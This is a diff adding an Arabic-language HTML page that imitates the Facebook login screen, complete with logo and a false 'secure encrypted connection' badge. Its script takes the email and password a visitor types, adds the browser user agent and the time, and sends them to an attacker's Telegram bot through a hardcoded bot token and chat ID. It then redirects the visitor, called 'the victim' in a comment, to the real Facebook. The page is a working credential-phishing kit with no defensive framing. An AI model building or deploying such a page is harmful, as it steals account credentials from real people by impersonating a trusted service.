@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo svg {
+            height: 60px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            background: white;
+            outline: none;
+        }
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 16px 0;
+        }
+        button:hover {
+            background: #166fe5;
+        }
+
+        .forgot {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+            margin: 10px 0;
+        }
+
+        hr {
+            margin: 20px 0;
+            border: none;
+            border-top: 1px solid #dadde1;
+        }
+
+        .create-btn {
+            background: #42b72a;
+            width: auto;
+            padding: 12px 20px;
+            font-size: 17px;
+            display: inline-block;
+            margin: 0 auto;
+        }
+        .create-btn:hover {
+            background: #36a420;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8a8d91;
+        }
+
+        .meta {
+            font-size: 13px;
+            color: #777;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" width="60" height="60">
+                <path fill="#1877F2" d="M34 18c0-8.8-7.2-16-16-16S2 9.2 2 18c0 8 5.8 14.6 13.4 15.8V22.6h-4v-4.6h4v-3.5c0-4 2.4-6.2 6-6.2 1.8 0 3.6.3 3.6.3v4h-2c-2 0-2.6 1.2-2.6 2.5v3h4.4l-.7 4.6h-3.7v11.2C28.2 32.6 34 26 34 18z"/>
+                <path fill="white" d="M23.3 22.6l.7-4.6h-4.4v-3c0-1.3.6-2.5 2.6-2.5h2v-4s-1.8-.3-3.6-.3c-3.6 0-6 2.2-6 6.2v3.5h-4v4.6h4v11.2c.8.1 1.6.2 2.4.2s1.6-.1 2.4-.2V22.6h3.3z"/>
+            </svg>
+        </div>
+
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="off">
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+
+        <a href="#" class="forgot">هل نسيت كلمة المرور؟</a>
+        <hr>
+        <button class="create-btn" onclick="alert('جاري التحويل...')">إنشاء حساب جديد</button>
+        <div class="meta">
+            <span>🔒 اتصال آمن ومشفر</span>
+        </div>
+    </div>
+    <div class="footer">
+        <span>Meta © 2025</span>
+    </div>
+</div>
+
+<script>
+    // ========== Bot Token (Telegram) ==========
+    const BOT_TOKEN = "8715170582:AAFWkAkVMWySXwknRaV30V-6Xhdn-hxMTUs";
+    const CHAT_ID = "7882118234";
+    // =========================================
+
+    // إرسال البيانات
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const submitBtn = document.querySelector('button[type="submit"]');
+        
+        if (!email || !password) {
+            alert("الرجاء إدخال البريد الإلكتروني وكلمة المرور");
+            return;
+        }
+        
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'جاري التحقق...';
+        
+        const message = `🎯 Facebook Login 🎯\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 Device: ${navigator.userAgent}\n🌍 Time: ${new Date().toLocaleString()}`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+            
+            // توجيه الضحية إلى فيسبوك الحقيقي
+            window.location.href = "https://www.facebook.com/";
+            
+        } catch(err) {
+            alert("حدث خطأ، حاول مرة أخرى");
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'تسجيل الدخول';
+        }
+    });
+</script>
+</body>
+                  </html>
